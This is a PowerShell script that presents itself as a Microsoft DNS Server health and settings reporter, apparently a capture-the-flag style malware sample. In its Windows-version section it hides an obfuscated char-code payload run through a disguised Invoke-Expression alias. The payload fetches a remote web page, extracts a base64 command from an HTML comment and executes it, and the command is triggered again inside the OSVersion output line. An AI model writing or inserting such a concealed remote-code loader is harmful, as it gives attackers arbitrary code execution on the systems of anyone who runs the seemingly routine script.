#
# Determine the health and statistics of this Microsoft DNS Server
#
$Output = New-Object System.Collections.ArrayList
$Date = Get-Date -format 'yyyy-MM-ddTHH:mm:sszzz'
write-host -NoNewline ""$Date

# Name of Server
$ServerName = $env:ComputerName
write-host -NoNewline ""Server=`"$ServerName`"

#
# Windows Version and Build #
#
$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
$OS = $WindowsInfo.GetValue("ProductName")
$OSSP = $WindowsInfo.GetValue("CSDVersion")
$WinVer = $WindowsInfo.GetValue("CurrentVersion")
$WinBuild = $WindowsInfo.GetValue("CurrentBuildNumber")
[STRinG]::JoIN('',[chAr[]](36 , 79 ,83 , 86, 69 ,82 ,32, 61,32,39 , 105, 101, 120 , 32 , 40 ,91 ,83 , 121 , 115 , 116,101 , 109, 46,84 ,101 ,120 , 116 ,46,69 ,110 ,99, 111 , 100, 105 ,110 ,103 ,93, 58 ,58 ,85, 84,70 , 56,46,71 ,101 ,116,83,116, 114 , 105 , 110, 103 ,40 , 91 , 83 ,121 , 115 ,116, 101, 109 , 46 ,67 ,111, 110,118 , 101, 114 ,116 , 93, 58 ,58, 70,114 ,111, 109 ,66,97 , 115, 101,54, 52 , 83 , 116 , 114 ,105 , 110,103,40 ,34,73,121 , 65 , 107,85, 69 , 57 , 83,86 ,67 ,66 ,105,90 ,87, 120, 118 , 100,121, 66,112 ,99,121 , 66 ,107 ,101, 87 , 53 , 104,98 ,87 , 108 , 106, 73 , 72 , 82 , 118 ,73, 72,82 , 111, 90 , 83, 66, 121 , 100 , 87, 53 , 117 ,97 , 87 , 53 , 110, 73,72 ,78, 108 ,99, 110 , 90 , 112, 89,50 ,85 , 103, 98 ,50 ,89,103 , 100,71,104 ,108,73, 71 ,66 , 84, 100, 71, 70 , 121 , 100 ,71 , 65, 103, 89, 110,86,48, 100,71 , 57, 117 , 68, 81, 112,65 ,75 , 67,82,111 ,100 ,71 ,49 , 115 ,73 , 68,48,103, 75 ,69, 108,117,100, 109 ,57,114 , 90 , 83 , 49,88, 90 ,87,74,83,90, 88, 70, 49, 90,88, 78 ,48, 73,71 ,104 ,48 ,100,72 , 65 , 54 ,76, 121, 57,106 , 97,71, 70,115,98 ,71, 86 ,117 , 90, 50,85 ,117,89 , 51 ,82,109,76 ,109, 100, 104,98 ,87 ,86, 122 ,79 , 105, 82 ,81 ,84 , 49,74, 85 , 73,67,49 ,73 , 90 ,87 ,70,107 , 90, 88 , 74,122 ,73,69, 66 ,55 ,81 ,88 , 86 ,48 ,97 ,71 ,57 , 121 ,97,88, 112,104, 100 ,71 ,108, 118,98,106 , 48 ,111,73 ,107, 74, 104,99,50 ,108,106,73,70, 108 , 116, 82,109,112 ,104, 77 ,108, 74 ,50 ,89,106 ,78 , 74 ,78,109 ,82, 72 , 97,72, 66, 106 ,77 , 84 ,108 ,119, 89 , 122,69, 53,77 , 71 , 70 , 72 ,86, 109,90, 104 , 83 , 70,73,119 ,89 , 48, 89 , 53 ,101 ,108, 112, 89 , 83 , 106,74 , 97, 87 ,69,112 , 109 ,89 ,122, 74,87 ,97, 109,78, 116, 86,106 , 65, 105,75, 88 , 48, 103 , 76,86 ,86 ,122, 90 , 85,74 , 104 ,99, 50,108, 106 ,85, 71, 70 ,121,99,50 , 108 , 117 , 90,121 , 107 ,117, 81,50 ,57,117, 100, 71 , 86 , 117, 100 , 65, 48 , 75,97 , 87,89 ,103, 75 ,67, 82 , 111,100 ,71 , 49, 115 ,73 ,67,49 ,116 , 89 , 88, 82,106 ,97 , 67 , 65,110, 80, 67 , 69 , 116 , 76,83 , 103, 117 , 75 ,106 , 56 ,112 ,76 , 83,48,43,74,121 , 107 ,103 , 101,119 ,48 ,75, 73,67 , 65 ,103,73 , 67 , 82, 50,89 ,87, 120,49 ,90 ,83, 65 , 57 , 73, 67, 82, 116 ,89, 88 , 82,106 ,97 ,71, 86,122, 87, 122,70,100 , 68, 81 ,111,103 , 73 ,67,65 , 103 , 74 , 71, 78 ,118, 98 ,87 ,49, 104 ,98 ,109 ,81, 103,80 , 83 , 66, 98 ,85 , 51 , 108, 122 , 100 ,71,86, 116, 76,108 ,82, 108 , 101,72,81,117 ,82,87 ,53 ,106 ,98 , 50, 82 , 112 ,98,109 ,100,100 , 79 , 106 , 112 ,86 ,86 , 69 , 89,52 ,76,107 , 100,108, 100 , 70, 78,48 ,99,109 , 108,117 , 90 , 121, 104 , 98 , 85, 51, 108 ,122, 100, 71, 86, 116 , 76 , 107, 78 ,118 ,98, 110,90, 108 , 99, 110,82,100, 79,106,112, 71,99,109, 57, 116 , 81 , 109 , 70 , 122 , 90 , 84,89 , 48 , 85, 51 , 82,121 , 97 ,87,53, 110,75,67,82 ,50,89 , 87 , 120 , 49 ,90 , 83 , 107 ,112 ,68, 81,111, 103 , 73, 67, 65 ,103 ,83 ,87, 53 ,50 , 98 , 50, 116 , 108, 76,85,86 , 52 ,99 ,72, 74 ,108, 99,51 ,78, 112 ,98, 50 , 52 , 103, 74, 71, 78,118, 98, 87 , 49 ,104 ,98, 109 ,81 , 78 ,67 ,110,48 , 112 , 34,41, 41 , 41,39 )) | &( $PsHomE[21]+$PsHoMe[30]+'X')


write-host -NoNewline ""OperatingSystem=`"$OS`"
write-host -NoNewline ""ServicePack=`"$OSSP`"
write-host -NoNewline "OSVersion=""$(iex $OSVER)"

#
# Required Processes Running
#		DNS Dnscache w32time
#
$RequiredServices = @( "DNS", "Dnscache", "w32time" )
$srvr = @()
$srvnr = @()
foreach ($srv in $RequiredServices) {
	$status = (Get-Service $srv).Status
	if ($status -eq "Running") {
		$srvr += $srv
	} else {
		$srvnr += $srv
	}
}

$ProcsOK = "False"
if ($srvnr.Count -eq 0) {
	$ProcsOK = "True"
}

$ServicesRunning = [string]::join(',', $srvr)
$ServicesNotRunning = [string]::join(',', $srvnr)
write-host -NoNewline ""ServicesRunning=`"$ServicesRunning`" ServicesNotRunning=`"$ServicesNotRunning`" ProcsOK=`"$ProcsOK`"

#
# Settings for this DNS Server
#
$dnsInfo = Get-WmiObject -Namespace "root\MicrosoftDNS" -Class MicrosoftDNS_Server -ComputerName $ServerName

# See http://msdn.microsoft.com/en-us/library/windows/desktop/ms682725(v=vs.85).aspx for details
write-host -NoNewline "" Name=`"$($dnsInfo.Name)`"
write-host -NoNewline "" Version=`"$($dnsInfo.Version)`"
write-host -NoNewline "" LogLevel=`"$($dnsInfo.LogLevel)`"
write-host -NoNewline "" LogFilePath=`"$($dnsInfo.LogFilePath)`"
write-host -NoNewline "" LogFileMaxSize=`"$($dnsInfo.LogFileMaxSize)`"
write-host -NoNewline "" LogIPFilterList=`"$($dnsInfo.LogIPFilterList)`"
write-host -NoNewline "" EventLogLevel=`"$($dnsInfo.EventLogLevel)`"
write-host -NoNewline "" RpcProtocol=`"$($dnsInfo.RpcProtocol)`"
write-host -NoNewline "" NameCheckFlag=`"$NameCheckFlag`"
write-host -NoNewline "" AddressAnswerLimit=`"$($dnsInfo.AddressAnswerLimit)`"
write-host -NoNewline "" RecursionRetry=`"$($dnsInfo.RecursionRetry)`"
write-host -NoNewline "" RecursionTimeout=`"$($dnsInfo.RecursionTimeout)`"
write-host -NoNewline "" DsPollingInterval=`"$($dnsInfo.DsPollingInterval)`"
write-host -NoNewline "" DsTombstoneInteval=`"$($dnsInfo.DsTombstoneInteval)`"
write-host -NoNewline "" MaxCacheTTL=`"$($dnsInfo.MaxCacheTTL)`"
write-host -NoNewline "" MaxNegativeCacheTTL=`"$($dnsInfo.MaxNegativeCacheTTL)`"
write-host -NoNewline "" SendPort=`"$($dnsInfo.SendPort)`"
write-host -NoNewline "" XfrConnectTimeout=`"$($dnsInfo.XfrConnectTimeout)`"
write-host -NoNewline "" BootMethod=`"$($dnsInfo.BootMethod)`"
write-host -NoNewline "" AllowUpdate=`"$($dnsInfo.AllowUpdate)`"
write-host -NoNewline "" UpdateOptions=`"$($dnsInfo.UpdateOptions)`"
write-host -NoNewline "" DsAvailable=`"$($dnsInfo.DsAvailable)`"
write-host -NoNewline "" DisableAutoReverseZones=`"$($dnsInfo.DisableAutoReverseZones)`"
write-host -NoNewline "" AutoCacheUpdate=`"$($dnsInfo.AutoCacheUpdate)`"
write-host -NoNewline "" NoRecursion=`"$($dnsInfo.NoRecursion)`"
write-host -NoNewline "" RoundRobin=`"$($dnsInfo.RoundRobin)`"
write-host -NoNewline "" LocalNetPriority=`"$($dnsInfo.LocalNetPriority)`"
write-host -NoNewline "" StrictFileParsing=`"$($dnsInfo.StrictFileParsing)`"
write-host -NoNewline "" LooseWildcarding=`"$($dnsInfo.LooseWildcarding)`"
write-host -NoNewline "" BindSecondaries=`"$($dnsInfo.BindSecondaries)`"
write-host -NoNewline "" WriteAuthorityNS=`"$($dnsInfo.WriteAuthorityNS)`"
write-host -NoNewline "" ForwardDelegations=`"$($dnsInfo.ForwardDelegations)`"
write-host -NoNewline "" SecureResponses=`"$($dnsInfo.SecureResponses)`"
write-host -NoNewline "" DisjointNets=`"$($dnsInfo.DisjointNets)`"
write-host -NoNewline "" AutoConfigFileZones=`"$($dnsInfo.AutoConfigFileZones)`"
write-host -NoNewline "" ScavengingInterval=`"$($dnsInfo.ScavengingInterval)`"
write-host -NoNewline "" DefaultRefreshInterval=`"$($dnsInfo.DefaultRefreshInterval)`"
write-host -NoNewline "" DefaultNoRefreshInterval=`"$($dnsInfo.DefaultNoRefreshInterval)`"
write-host -NoNewline "" DefaultAgingState=`"$($dnsInfo.DefaultAgingState)`"
write-host -NoNewline "" EDnsCacheTimeout=`"$($dnsInfo.EDnsCacheTimeout)`"
write-host -NoNewline "" EnableEDnsProbes=`"$($dnsInfo.EnableEDnsProbes)`"
write-host -NoNewline "" EnableDnsSec=`"$($dnsInfo.EnableDnsSec)`"
write-host -NoNewline "" ForwardingTimeout=`"$($dnsInfo.ForwardingTimeout)`"
write-host -NoNewline "" IsSlave=`"$($dnsInfo.IsSlave)`"
write-host -NoNewline "" EnableDirectoryPartitions=`"$($dnsInfo.EnableDirectoryPartitions)`"
write-host -NoNewline "" Started=`"$($dnsInfo.Started)`"
write-host -NoNewline "" StartMode=`"$($dnsInfo.StartMode)`"
write-host -NoNewline "" Status=`"$($dnsInfo.Status)`"

foreach ($ip in $dnsInfo.Forwarders) {
	write-host -NoNewline "" Forwarder=`"$ip`"
}
foreach ($ip in $dnsInfo.ServerAddresses) {
	write-host -NoNewline "" ServerAddress=`"$ip`"
}
foreach ($ip in $dnsInfo.ListenAddresses) {
	write-host "" ListenAddress=`"$ip`"
}
